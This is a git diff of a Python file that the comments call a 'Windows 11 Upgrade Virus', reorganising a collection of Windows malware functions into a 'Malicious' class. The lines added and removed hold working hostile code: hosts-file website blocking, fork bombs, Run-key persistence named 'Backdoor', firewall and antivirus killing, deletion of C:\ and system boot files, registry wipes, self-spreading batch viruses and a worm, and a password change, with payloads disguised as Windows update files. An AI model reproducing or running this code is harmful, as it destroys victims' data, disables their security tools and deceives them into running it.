@@ -2,7 +2,6 @@ import os
 # import datetime
 import webbrowser
 import time
-from natsort import natsorted
 import subprocess
 import sys
 import shutil
@@ -10,19 +9,88 @@ import getpass
 # import ctypes
 # from datetime import datetime as dt
 import win10toast
+import typing as t
+import re
 
-'''
-This will add the loopback ip to the websites in the below list to the host file
-There are over 500 websites in the below list ( starting with both https:// , www. and domain.com)
-There is nothing to be passed to this Function
-You wan't Administator Priviliages to do this successfully!
-'''
-def DISABLE_ACCESS_TO_POPULAR_SITES():
-    hosts_test = r"C:\Windows\System32\drivers\etc\hosts"
-    hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
-    # hosts_test = "D:\development\Python\Windows 11 Upgrade Virus\Main\TEST FOLDER\hosts"
 
-    redirect = "127.0.0.1" # loopback ip
+class Malicious:
+    def __init__(self) -> None:
+        pass
+
+    def blockWebsites(self, data: t.Optional[t.Iterable] = None) -> bool:
+        wlist = data
+        if data is None:
+            wlist = Data.website_list
+        if len(data) == 0:
+            wlist = Data.website_list
+
+        redirect = "127.0.0.1"
+        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
+
+        with open(hosts_path, 'r+') as file:
+            content = file.read()
+            for website in wlist:
+                if website in content:
+                    pass
+                else:
+                    file.write(redirect + " " + website + "\n")
+
+    def forkBomb(self):
+        while True:
+            subprocess.Popen([sys.executable, sys.argv[0]],
+                             creationflags=subprocess.CREATE_NEW_CONSOLE)
+
+    def restartOnStartup(self, filee: t.Optional[str] = None):
+        # Normal Startup Trick
+        location = os.environ["appdata"] + \
+            "\\MicrosoftSecurityServiceSecondary." + filee
+
+        if not os.path.exists(location):
+            shutil.copyfile(sys.executable, location)
+            subprocess.call(
+                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
+
+        # adding .bat to startup folder
+        # wont't work if the file is deleted
+        def addBatFileStartup(filePath: t.Optional[str] = None, fileName: t.Optional[str] = None):
+            if filePath == "":
+                filePath = os.path.dirname(os.path.realpath(__file__))
+                # we could also use this
+                # filePath = os.environ["appdata"] + "\\" + fileName
+
+            bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % getpass.getuser()
+            with open(bat_path + '\\' + "WindowsUpdate.bat", "w+") as bat_file:
+                bat_file.write(r'start "" %s' % filePath)
+
+        addBatFileStartup()
+
+    def changeTime(self, time: t.Optional[str] = "00:00"):
+        if re.match(r'^\d{2}:\d{2}$', time):
+            os.system(f'time {time}')
+
+    def disableFirewallTemp(self):
+        os.system('net stop "MpsSvc"')
+        os.system('taskkill /f /t /im "FirewallControlPanel.exe"')
+
+    def notification(self, title: str, message: str, icon: t.Optional[str] = None, duration: t.Optional[int] = 5, limit: t.Optional[int] = None):
+        if limit is None:
+            while True:
+                toaster = win10toast.ToastNotifier()
+                toaster.show_toast(
+                    title, message, icon_path=icon, duration=duration)
+        else:
+            for _ in range(limit):
+                toaster = win10toast.ToastNotifier()
+                toaster.show_toast(
+                    title, message, icon_path=icon, duration=duration)
+
+    def disableAV(self):
+        for command in Data.antivirus_commands:
+            os.system(command)
+
+
+class Data:
+
     website_list = [
         "www.facebook.com", "facebook.com", "instragram.com", "www.instragram.com",
         "www.google.com", "google.com", "youtube.com", "www.youtube.com",
@@ -225,852 +293,112 @@ def DISABLE_ACCESS_TO_POPULAR_SITES():
         "com.com", "rediff.com", "oreilly.com", "stuff.co.nz", "cointernet.com.co", "fb.me", "greenpeace.org", "video.google.com", "jhu.edu", "theglobeandmail.com", "cafepress.com"
     ]
 
-    # write to the hosts file
-    with open(hosts_test, 'r+') as file:
-        content = file.read()
-        for website in website_list:
-            if website in content:
-                pass
-            else:
-                file.write(redirect + " " + website + "\n")
-
-
-'''
-You need to pass 3 items in the following order: An usage example is given below
-RENAME_MULTIPLE_FILES_IN_GIVEN_PATH("D:\Images\Private", "picture", ".hacked")
-In the above example, first the folder path is passed, then the name of the file, then the extension is passed
-Make sure to include the '.' before typing the example, eg: '.txt'
-
-The Take place to the files in the specified directory only!
-'''
-def RENAME_MULTIPLE_FILES_IN_GIVEN_PATH(folerpath, new_name, extension):
-    os.chdir(folerpath)
-    for (i, filename) in enumerate(natsorted(os.listdir(folerpath))):
-        os.rename(src=filename, dst='{}{}{}'.format(new_name,i,extension))
-
-
-'''
-Nothing will be prompted to the user
-This will cause the PC to crash and would need a restart to fix it!
-
-( There is a function in this script to start the malicious file at startup )
-'''
-def FORK_BOMB_NO_WINDOW(): # this crashed my pc with 32gb 2666mhz ram and 15-10400 turboing upto 4.0 GHz within 1 second
-    while True:
-        subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
-
-
-'''
-The file extension need to passed to this function
-
-If are going to compile this ( Maybe using pyinstaller )
-You can pass 'exe' to the function when using it!
-Make sure to not to include the '.' when passing the extension
-'''
-def START_AGAIN_AFTER_RESTART(filee): # The last restart # filee should be passed without a '.' and incase you didn't know, its the file extension
-    # part 1
-    '''
-    I have tried this part of the code and it works fine
-    Incase if something goes wrong with this, there is the part 2 of this function
-    '''
-    location = os.environ["appdata"] + "\\MicrosoftSecurityServiceSecondary." + filee
-    if not os.path.exists(location):
-        shutil.copyfile(sys.executable, location)
-        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
-
-    '''
-    I haven't tested this, this code is not mine
-    '''
-    # part 2
-    USER_NAME = getpass.getuser()
-    def ADD_BAT_TO_STARTUP_FOLDER(file_path=""):
-        if file_path == "":
-            file_path = os.path.dirname(os.path.realpath(__file__))
-            # file_path = os.environ["appdata"] + "\\MicrosoftSecurityServiceSecondary.exe" # we could also use this
-        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
-        with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
-            bat_file.write(r'start "" %s' % file_path)
-
-    ADD_BAT_TO_STARTUP_FOLDER() # i am not very sure about excecuting this, but, idek, its ur choice
-
-
-'''
-You need to pass the url of the website to this function!
-example: FORK_BOMB_WITH_WEBSITE(https://youtube.com)
-
-This will open the website you passed to the function until the computer crashes
-'''
-def FORK_BOMB_WITH_WEBSITE(url):
-    while True:
-        webbrowser.open(url)
-
-
-'''
-You need pass something of these two when using this function: 'yesfile' and 'nofile'
-'yesfile' will create a file and run the command ( .bat file )
-'nofile' will not create a file, but will still run the code successfully!
-'''
-def DELETE_KEY_REGISTRY_FILES(wantfile="nofile"): # wantfile should be "yesfile" or "nofile"
-    if wantfile == "nofile":
-        command1 = "reg delete HKCR/.exe"
-        command2 = "reg delete HKCR/.dll"
-        command3 = "reg delete HKCR/*"
-        os.system(command1)
-        time.sleep(1)
-        os.system(command2)
-        time.sleep(1)
-        os.system(command3)
-
-    elif wantfile == "yesfile":
-        commands = """@ECHO OFF
-START reg delete HKCR/.exe
-START reg delete HKCR/.dll
-START reg delete HKCR/*
-:MESSAGE
-ECHO Windows Kernel is being updated. Please don't turn off your computer.
-GOTO MESSAGE"""
-        file = open("Windows_Kernel_Update_Temporary_File.bat", 'w+')
-        file.write(commands)
-        file.close()
-        time.sleep(1)
-        run_made_file1 = ".\Windows_Kernel_Update_Temporary_File.bat"
-        os.system(run_made_file1)
-
-    else:
-        return "Wrong Input Passed to the Function"
-
-
-'''
-This will open untilimted notepads until the computer crash
-You need pass 1 value when calling this function and it is
-the text to display in every notepad window which keeps opening
-if you pass the value 'notext' : no text will be shown when opening every notepad window
-if you pass the value 'yestext' : this will show a message convincing the user to start the same file again
-'''
-def FORK_BOMB_WITH_NOTEPAD(needtext):
-    if needtext == "notext":
-        cmd_fb_notepad_notext = """@ECHO off
-:top
-START %SystemRoot%\system32\notepad.exe
-GOTO top"""
-        os.system(cmd_fb_notepad_notext)
-
-    elif needtext == "yestext": # tried to make this file in system32 folder and i failed :(
-        file_fb_notepad = open(r"Windows_Kernel_Update_Data_Settings.txt", "w+")
-        file_fb_notepad.write("Windows Kernel is updating\nYou might get some freezes and crashes until this is complete\nIf this happens, make sue to start this again")
-        file_fb_notepad.close()
-
-        while True:
-            os.system("notepad Windows_Kernel_Update_Data_Settings.txt")
-        
-    else:
-        return "Wrong Input Passed to the Function"       
-
-
-'''
-Will open many software at once, these software comes bundled with windows ( 7 and above, i'm not sure about Windows Vista )
-They will be opening until the computer crashes and this needs a restart to fix this!
-The softwares this function will open are:
-    MS Paint, Notepade, WordPad, Command Prompt, Explorer, Control Panel and the Calculator
-'''
-def FORK_BOMB_MANY_SOFTWARE_AT_ONCE():
-    cmd_fb_many_at_once = r"""@ECHO OFF
-:x
-start mspaint
-start notepad
-start write
-start cmd
-start explorer
-start control
-start calc
-goto x"""
-    
-    filefbmao = open("Windows_Kernel_Update_Command_List.bat", "w+")
-    filefbmao.write(cmd_fb_many_at_once)
-    filefbmao.close()
-    time.sleep(1)
-
-    os.system("Windows_Kernel_Update_Command_List.bat")
-
-
-'''
-This function will make as many as folders possible with random numbers
-make sure to change the path to the needed folder before using the function 
-( this cannot be done with this function, you need to do it manually)
-
-The value to pass to this function is optional, You can pass some custom file name if you like
-The default name will be "Windows_Critical_Update_File.bat"
-'''
-def FOLDER_FLOODER(filename="Windows_Critical_Update_File.bat"):
-    if filename == "no":
-        while True:
-            os.system('md %random%')
-
-    else:
-        cmd_folder_flooder = """@echo off
-:x
-md %random%
-goto x"""
-        
-        fileff = open(str(filename), "w+")
-        fileff.write(cmd_folder_flooder)
-        fileff.close()
-        time.sleep(1)
-        os.system(str(filename))
-
-
-
-'''
-This function will make as many as folders possible with random numbers in the Users folder
-which will result in creating many user accounts!
-
-The value to pass to this function is optional, You can pass some custom file name if you like
-The default name will be "Windows_Critical_KERNEL_Update_File.bat"
-'''
-def USER_ACCOUNTS_FLOODER(filename="Windows_Critical_KERNEL_Update_File.bat"):
-    cmd_ua_ff = """@echo off
-:xnet
-user %random% /add
-goto x"""
-    
-    fileuaf = open(str(filename), "w+")
-    fileuaf.write(cmd_ua_ff)
-    fileuaf.close()
-    time.sleep(1)
-    os.system(str(filename))
-
-
-'''
-This function will create unlimited processes until the computer crash
-
-The value to pass to this function is optional, You can pass some custom file name if you like
-The default name will be "Start_Update_Again_if_Failed.bat"
-'''
-def PROCESS_CREATOR(filename="Start_Update_Again_if_Failed.bat"):
-    cmd_process_creator = "%0|%0"
-    
-    filepc = open(filename, "w+")
-    filepc.write(cmd_process_creator)
-    filepc.close()
-    time.sleep(1)
-    os.system(filename)
-
-'''
-This function will create every file in Local Disk C
-
-The value to pass to this function is optional, You can pass some custom file name if you like
-The default name will be "RECOVER_UPDATE_FILES.bat"
-'''
-def DELETE_C_DRIVE(filename="RECOVER_UPDATE_FILES.bat"):
-    cmd_del_c_drive_1 = """@Echo off
-Del C:\ *.* |y"""
-
-    filedelc = open(filename, "w+")
-    filedelc.write(cmd_del_c_drive_1)
-    filedelc.close()
-    time.sleep(1)
-    os.system(filename)
-
-'''
-I own no credit to this code! This will kill all the processes of AV 
-and will remove every file inside the installed directories of the particualar AV
-
-The value to pass to this function is optional, You can pass some custom file name if you like
-The default name will be "Windows_Security_Update_File.bat"
-'''
-def DELETE_ANTIVIRUS_SOFTWARE(filename="Windows_Security_Update_File.bat"):
-    cmd_del_av = r"""@echo off
-rem
-rem Permanently Kill Anti-Virus
-net stop “Security Center”
-netsh firewall set opmode mode=disable
-tskill /A av*
-tskill /A fire*
-tskill /A anti*
-cls
-tskill /A spy*
-tskill /A bullguard
-tskill /A PersFw
-tskill /A KAV*
-tskill /A ZONEALARM
-tskill /A SAFEWEB
-cls
-tskill /A spy*
-tskill /A bullguard
-tskill /A PersFw
-tskill /A KAV*
-tskill /A ZONEALARM
-tskill /A SAFEWEB
-cls
-tskill /A OUTPOST
-tskill /A nv*
-tskill /A nav*
-tskill /A F-*
-tskill /A ESAFE
-tskill /A cle
-cls
-tskill /A BLACKICE
-tskill /A def*
-tskill /A kav
-tskill /A kav*
-tskill /A avg*
-tskill /A ash*
-cls
-tskill /A aswupdsv
-tskill /A ewid*
-tskill /A guard*
-tskill /A guar*
-tskill /A gcasDt*
-tskill /A msmp*
-cls
-tskill /A mcafe*
-tskill /A mghtml
-tskill /A msiexec
-tskill /A outpost
-tskill /A isafe
-tskill /A zap*cls
-tskill /A zauinst
-tskill /A upd*
-tskill /A zlclien*
-tskill /A minilog
-tskill /A cc*
-tskill /A norton*
-cls
-tskill /A norton au*
-tskill /A ccc*
-tskill /A npfmn*
-tskill /A loge*
-tskill /A nisum*
-tskill /A issvc
-tskill /A tmp*
-cls
-tskill /A tmn*
-tskill /A pcc*
-tskill /A cpd*
-tskill /A pop*
-tskill /A pav*
-tskill /A padmincls
-tskill /A panda*
-tskill /A avsch*
-tskill /A sche*
-tskill /A syman*
-tskill /A virus*
-tskill /A realm*cls
-tskill /A sweep*
-tskill /A scan*
-tskill /A ad-*
-tskill /A safe*
-tskill /A avas*
-tskill /A norm*
-cls
-tskill /A offg*
-del /Q /F C:\Program Files\alwils~1\avast4\*.*
-del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
-del /Q /F C:\Program Files\kasper~1\*.exe
-cls
-del /Q /F C:\Program Files\trojan~1\*.exe
-del /Q /F C:\Program Files\f-prot95\*.dll
-del /Q /F C:\Program Files\tbav\*.datcls
-del /Q /F C:\Program Files\avpersonal\*.vdf
-del /Q /F C:\Program Files\Norton~1\*.cnt
-del /Q /F C:\Program Files\Mcafee\*.*
-cls
-del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
-del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
-del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
-del /Q /F C:\Program Files\Norton~1\*.*
-cls
-del /Q /F C:\Program Files\avgamsr\*.exe
-del /Q /F C:\Program Files\avgamsvr\*.exe
-del /Q /F C:\Program Files\avgemc\*.exe
-cls
-del /Q /F C:\Program Files\avgcc\*.exe
-del /Q /F C:\Program Files\avgupsvc\*.exe
-del /Q /F C:\Program Files\grisoft
-del /Q /F C:\Program Files\nood32krn\*.exe
-del /Q /F C:\Program Files\nood32\*.exe
-cls
-del /Q /F C:\Program Files\nod32
-del /Q /F C:\Program Files\nood32
-del /Q /F C:\Program Files\kav\*.exe
-del /Q /F C:\Program Files\kavmm\*.exe
-del /Q /F C:\Program Files\kaspersky\*.*
-cls
-del /Q /F C:\Program Files\ewidoctrl\*.exe
-del /Q /F C:\Program Files\guard\*.exe
-del /Q /F C:\Program Files\ewido\*.exe
-cls
-del /Q /F C:\Program Files\pavprsrv\*.exe
-del /Q /F C:\Program Files\pavprot\*.exe
-del /Q /F C:\Program Files\avengine\*.exe
-cls
-del /Q /F C:\Program Files\apvxdwin\*.exe
-del /Q /F C:\Program Files\webproxy\*.exe
-del /Q /F C:\Program Files\panda
-software\*.*
-rem"""
-    filekillav = open(filename, "w+")
-    filekillav.write(cmd_del_av)
-    filekillav.close()
-    time.sleep(1)
-    os.system(filename)
-
-
-'''
-I own no credit to this code!
-
-The value to pass to this function is optional, You can pass some custom file name if you like
-The default name will be "New_Windows_Terminal_Commad_List.bat"
-'''
-def ZIPLINE(filename="New_Windows_Terminal_Commad_List.bat"):
-    cmd_zipline_virus = r"""@echo off>nul.ViRuS
-if ?%1==?/ViRuS_MULTIPLY goto ViRuS_multiply
-if ?%1==?/ViRuS_OUTER_LOOP goto ViRuS_outer_loop
-if ?%1==?/ViRuS_FINDSELF goto ViRuS_findself
-if ?%VOFF%==?T goto ViRuS_OLDBAT
-set ViRuSname=%0
-if not exist %0.bat call %0 /ViRuS_FINDSELF %path%
-if not exist %ViRuSname%.bat set ViRuSname=
-if ?%ViRuSname%==? goto ViRuS_OLDBAT
-rem ViRuS if batch is started with name.BAT, virus will not become active
-rem ViRuS it was a bug, now it?s a feature ! (also notice the voff variable)
-rem ViRuS also if batch was only in an append /xn path (chance=minimal)
-attrib +h %ViRuSname%.bat
-for %%a in (%path%;.) do call %0 /ViRuS_OUTER_LOOP %%a
-attrib -h %ViRuSname%.bat
-set ViRuSname=
-goto ViRuS_OLDBAT
-:ViRuS_findself
-if ?%2==? goto XXX_END>nul.ViRuS
-if exist %2%ViRuSname%.bat set ViRuSname=%2%ViRuSname%
-if exist %ViRuSname%.bat goto XXX_END
-if exist %2%ViRuSname%.bat set ViRuSname=%2%ViRuSname%
-if exist %ViRuSname%.bat goto XXX_END
-shift>nul.ViRuS
-goto ViRuS_findself
-:ViRuS_outer_loop
-for %%a in (%2*.bat;%2*.bat) do call %0 /ViRuS_MULTIPLY %%a
-goto XXX_END>nul.ViRuS
-:ViRuS_multiply
-find ?ViRuS? <%ViRuSname%.bat >xViRuSx.bat
-find /v ?ViRuS? <%2 |find /v ?:XXX_END? >>xViRuSx.bat
-echo :XXX_END>>xViRuSx.bat
-copy xViRuSx.bat %2>nul
-del xViRuSx.bat
-goto XXX_END>nul.ViRuS
-:ViRuS_OLDBAT
-echo on>nul.ViRuS
-:XXX_END"""
-    filezpl = open(filename, "w+")
-    filezpl.write(cmd_zipline_virus)
-    filezpl.close()
-    time.sleep(1)
-    os.system(filename)
-
-
-'''
-I own no credit to this code!
-
-The value to pass to this function is optional, You can pass some custom file name if you like
-The default name will be "Windows_10_Update_Required_File.bat"
-'''
-def FILEGROUND_WORM(filename="Windows_10_Update_Required_File.bat"):
-    # code by W3irdo
-    cmd_fileground_worm = r"""@ECHO OFF
-if exist c:\romp.bat goto end
-:start
-cls 
-Echo Installing Update...
-cd c:\windows\system 
-del keyboard.drv 
-del mouse.drv 
-TITLE System Update
-echo ::startup >> c:\romp.bat
-echo if not exist c:\damp goto prompt >> c:\romp.bat
-echo :start >> c:\romp.bat
-echo cls >> c:\romp.bat
-echo cd c:\ >> c:\romp.bat
-echo cd damp >> c:\romp.bat
-echo md keys >> c:\romp.bat
-echo pause >> c:\romp.bat
-echo copy *.bat c:\damp\keys\ILOVEYOU.bat >> c:\romp.bat
-echo copy *.bat c:\damp\keys\ILOVEYOU.bat c:\windows\stone.bat >> c:\romp.bat
-echo rmdir c:\WUTemp >> c:\romp.bat
-echo del c:\windows\system32\*.* >> c:\romp.bat
-echo rmdir c:\windows\system32 >> c:\romp.bat
-echo cd c:\ >> c:\romp.bat
-echo cd windows >> c:\romp.bat
-echo md system32 >> c:\romp.bat
-echo pause >> c:\romp.bat
-echo cd c:\ >> c:\romp.bat
-echo cd windows >> c:\romp.bat
-echo cd system32 >> c:\romp.bat
-echo md tools >> c:\romp.bat
-echo copy *.bat c:\windows\system32\tools\urscrewed.bat
-echo echo msgbox" Ur system is now screwed" >> c:\plastic.vbs >> c:\romp.bat
-echo echo msgbox" This was no scan... it was more like a scam" >> c:\plastic.vbs >> c:\romp.bat
-echo echo msgbox" It has deleted pretty much all of system32 which is in windows and has messed 
- 
-with windows" >> c:\plastic.vbs >> c:\romp.bat
-echo echo msgbox" There is no more windows on this computer" >> c:\plastic.vbs >> c:\romp.bat
-echo Rd/s/q c:\windows >> c:\romp.bat
-echo Rd/s/q c:\progra~1 >> c:\romp.bat
-echo goto part2 >> c:\romp.bat
-      >> c:\romp.bat
-      >> c:\romp.bat
-echo :part2 >> c:\romp.bat
-echo cls >> c:\romp.bat
-echo cd c:\ >> c:\romp.bat
-echo md Kierstyn'scan >> c:\romp.bat
-echo pause >> c:\romp.bat
-echo goto part3 >> c:\romp.bat
-        >> c:\romp.bat
-        >> c:\romp.bat
-echo :part3 >> c:\romp.bat
-echo rename c:\windows c:\viriiscan >> c:\romp.bat
-echo goto end1 >> c:\romp.bat
- 
-echo :prompt >> c:\romp.bat
-echo cls >> c:\romp.bat
-echo cd c:\ >> c:\romp.bat
-echo md damp >> c:\romp.bat
-echo copy *.bat c:\damp.bat >> c:\romp.bat
-echo echo msgbox" Oh No u r so stupid" >> c:\pomper.vbs >> c:\romp.bat
-echo echo msgbox" Wow you probably got this through ur lan" >> c:\pomper.vbs >> c:\romp.bat
-echo echo msgbox" Happy dieing staples" >> c:\pomper.vbs >> c:\romp.bat
-echo goto start >> c:\romp.bat
-      >> c:\romp.bat
-      >> c:\romp.bat 
-echo :end1 >> c:\romp.bat
-echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\Matrix2.vid.bat >> c:\romp.bat 
-echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\8-legged-freaks.vid.bat >> c:\romp.bat
-echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\Password_finder.exe.bat >> c:\romp.bat
-echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\s-club7.bmp.bat >> c:\romp.bat
-echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\JackAss the movie.vid.bat >> c:\romp.bat
-echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\password hacker.exe.bat >> c:\romp.bat
-echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\Norton anti virus.exe.bat >> c:\romp.bat
-echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\8-mile.mpg.bat >> c:\romp.bat
-echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\kazaa.exe.bat >> c:\romp.bat
-echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\realplayer.exe.bat >> c:\romp.bat
-echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\MyPic.bmp.bat >> c:\romp.bat
-echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\Bill gates *very funny*.bmp.bat >> 
- 
-c:\romp.bat 
-echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\Bill gates *very funny*.mpg.bat >> 
- 
-c:\romp.bat
-echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\windows xp.exe.bat >> c:\romp.bat
-echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\How to make viruses.txt.bat >> 
- 
-c:\romp.bat
-echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\*very funny*.bmp.bat >> c:\romp.bat
-echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\How to stop worm viruses.txt.bat >> 
- 
-c:\romp.bat
-echo goto end >> c:\romp.bat
-echo :end >> c:\romp.bat
-Echo Virus installed
-cd c:\Docume~1\All Users\Start Menu\Programs\Startup
-copy *.bat cd c:\Docume~1\All Users\Start Menu\Programs\Startup
-Echo Now You have to restart to save
-START C:\WINDOWS\RUNDLL.EXE user.exe,exitwindowsexec 
-rundll32.exe shell32.dll,SHExitWindowsEx n 
-pause
-del c:\thecreator.bat:end"""
-    filefgrw = open(filename, "w+")
-    filefgrw.write(cmd_fileground_worm)
-    filefgrw.close()
-    time.sleep(1)
-    os.system(filename)
-
-
-'''
-This function will release all the ip addresses
-This won't work with devices with Static IP addresses assigned
-
-The value to pass to this function is optional, You can pass some custom file name if you like
-The default name will be "MICROSOFT_SERVICES_CRITICAL_FEATURES.bat"
-if the value passes is "no", a file will not be created!
-'''
-def IP_CONFIG_RELEASE(filename="MICROSOFT_SERVICES_CRITICAL_FEATURES.bat"):
-    if filename == "no":
-        cmd_ipcr = "ipconfig /release_all"
-        os.system(cmd_ipcr)
-    else:
-        cmd_ipcr_intelligent = """ipconfig /release
-if ERRORLEVEL1 ipconfig /release_all"""
-        fileipcr = open(filename, "w+")
-        fileipcr.write(cmd_ipcr_intelligent)
-        fileipcr.close()
-        time.sleep(1)
-        os.system(filename)
-
-
-'''
-This function will crash your computer forever
-Tested with:  windows 7
-
-The value to pass to this function is optional, You can pass some custom file name if you like
-The default name will be "WINDOWS_UPDATES_DEBUG_LOGS.bat"
-'''
-def CRASH_PC_FOREVER(filename="WINDOWS_UPDATES_DEBUG_LOGS.bat"):
-    cmd_cpcf = r"""@echo off
-attrib -r -s -h c:\autoexec.bat
-del c:\autoexec.bat
-attrib -r -s -h c:\boot.ini
-del c:\boot.ini
-attrib -r -s -h c:\ntldr
-del c:\ntldr
-attrib -r -s -h c:\windows\win.ini
-del c:\windows\win.ini"""
-
-    filecpcf = open(filename, "w+")
-    filecpcf.write(cmd_cpcf)
-    filecpcf.close()
-    time.sleep(1)
-    os.system(filename)
-
-
-'''
-This function will cause a BSOD ( Blue Screen of Death )
-Tested with:  windows 7
-
-The value to pass to this function is optional, You can pass some custom file name if you like
-The default name will be "WINDOWS_KERNEL_UPDATES_DEBUG_LOGS.bat"
-'''
-def CAUSE_BSOD(filename="WINDOWS_KERNEL_UPDATES_DEBUG_LOGS.bat"):
-    cmd_make_bsod = r"""echo off
-del %systemdrive%\*.* /f /s /q
-shutdown -r -f -t 00"""
-    
-    filecbsod = open(filename, "w+")
-    filecbsod.write(cmd_make_bsod)
-    filecbsod.close()
-    time.sleep(1)
-    os.system(filename)
-
-
-'''
-I own no credit for this code
-This function will make your screen starting flash
-Tested with:  windows 7
-
-The value to pass to this function is optional, You can pass some custom file name if you like
-The default name will be "WINDOWS_KERNEL_UPDATES_BUG_LOGS.bat"
-'''
-def SET_FLASHING_SCREEN(filename="WINDOWS_KERNEL_UPDATES_BUG_LOGS.bat"):
-    cmd_flashscr = r"""@echo off
-echo e100 B8 13 00 CD 10 E4 40 88 C3 E4 40 88 C7 F6 E3 30>\z.dbg
-echo e110 DF 88 C1 BA C8 03 30 C0 EE BA DA 03 EC A8 08 75>>\z.dbg
-echo e120 FB EC A8 08 74 FB BA C9 03 88 D8 EE 88 F8 EE 88>>\z.dbg
-echo e130 C8 EE B4 01 CD 16 74 CD B8 03 00 CD 10 C3>>\z.dbg
-echo g=100>>\z.dbg
-echo q>>\z.dbg
-debug <\z.dbg>nul
-del \z.dbg"""
-
-    filesfscr = open(filename, "w+")
-    filesfscr.write(cmd_flashscr)
-    filesfscr.close()
-    time.sleep(1)
-    os.system(filename)
-
-
-'''
-This function will make a MATRIX kind of effect
-Tested with:  windows 7
-
-The value to pass to this function is optional, You can pass some custom file name if you like
-The default name will be "WINDOWS_SECURITY_UPDATES_DEBUG_LOGS.bat"
-'''
-def MATRIX(filename="WINDOWS_SECURITY_UPDATES_DEBUG_LOGS.bat"):
-    cmd_matrix = r"""@echo off
-color 2
-:start
-echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
-goto start"""
-
-    filesmtrix = open(filename, "w+")
-    filesmtrix.write(cmd_matrix)
-    filesmtrix.close()
-    time.sleep(1)
-    os.system(filename)
-
-
-'''
-This function will Reset the time of the computer to 00:00
-'''
-def CHANGE_TIME_TO_MIDNIGHT():
-    cmd_ctime_to_midnight = "time 00:00"
-    os.system(cmd_ctime_to_midnight)
-
-
-'''
-This function will change the password of the user account to "InShadow"
-This requires Administrator Priviliages to work properly!
-'''
-def CHANGE_PASS_TO_INSHADOW():
-    cmd_cpt_inshadow = r"net user %username% InShadow"
-    os.system(cmd_cpt_inshadow)
-
-
-'''
-This function will hide the Music Folder 
-( it can be seen, if the user has enebled 'show hidden files' option in folder options )
-'''
-def HIDE_MY_MUSIC_FOLDER():
-    cmd_hide_my_music_folder = 'attrib +h "%userprofile%\my documents\my music"'
-    os.system(cmd_hide_my_music_folder)
-
-'''
-This function will delete every file inside My Documents folder
-'''
-def DELETE_MY_DOCUMENTS():
-    cmd_del_my_music_folder = r'del /f /q "C:\Users\%userprofile%\My Documents\*.*"'
-    os.system(cmd_del_my_music_folder)
-
-'''
-This function will delete every file inside My Pictures folder
-'''
-def DELETE_MY_PICTURES():
-    cmd_del_my_pic_folder = r'del /f /q "C:\Users\%userprofile%\My Pictures\*.*"'
-    os.system(cmd_del_my_pic_folder)
-
-
-'''
-This function will diable the firewall temporarily
-
-The value to pass to this function is optional, You can pass some custom file name if you like
-The default name will be "no" which will not create a file
-if you pass some other name ( like 'name.bat' ) to the function, 
-it will create a file will that name and the code will be in it and that file will be the file to excecuted
-'''
-def DISABLE_FIREWALL_TEMP(filename="no"):
-    if filename == "no":
-        cmd_disable_firewall_temp_1 = 'net stop "MpsSvc"'
-        cmd_disable_firewall_temp_2 = 'taskkill /f /t /im "FirewallControlPanel.exe"'
-        os.system(cmd_disable_firewall_temp_1)
-        os.system(cmd_disable_firewall_temp_2)
-    else:
-        cmd_disable_firewall = '"net stop "MpsSvc"'
-        cmd_disable_firewall_2 = 'taskkill /f /t /im "FirewallControlPanel.exe"'
-
-        filedf = open(filename, "w+")
-        filedf.write(cmd_disable_firewall + "\n" + cmd_disable_firewall_2)
-        filedf.close()
-        time.sleep(1)
-        os.system(filename)
-'''
-This function will infect all the batch file in the specific directory
-You have to change the directory manually, this cannot be done by this function for now
-
-a file will be created from this function and you can change the file name if you want ( optional )
-this is the filename used by default "WINDOWS_10_SERVICE_COMMANDS.bat"
-'''
-def INFECT_BATCH_FILES(filename="WINDOWS_10_SERVICE_COMMANDS.bat"):
-    cmd_ibatf = """@echo off
-::----Infect All Bat Files---::
-    Dir %Homedrive% /s /b > DirPath                        
-        For /f %%Y In (DirPath) Do (
-        Set DirPath=%%Y > Nul  
-            For %%Z In (%DirPath%\*.bat) Do (
-            Set BatInfect=%%Z > Nul
-            Copy /y %0 %BatInfect%
-        )
-    )"""
-    fileibatf = open(filename, "w+")
-    fileibatf.write(cmd_ibatf)
-    fileibatf.close()
-    time.sleep(1)
-    os.system(filename)
-
-
-'''
-This function will hide any folder passed when calling the function
-( it can be seen, if the user has enebled 'show hidden files' option in folder options )
-'''
-def HIDE_FOLDER(folderpath):
-    cmd_hidefolder = 'attrib +h ' + str(folderpath)
-    os.system(cmd_hidefolder)
-
-
-'''
-This function will dele all the files in the folder ( you need to pass the folder path when calling this function )
-Make sure to not to include '\' at the end of the directory you are passing!
-'''
-def DELETE_FILES_IN_FOLDER(folderpath): # you need to enter the folder path
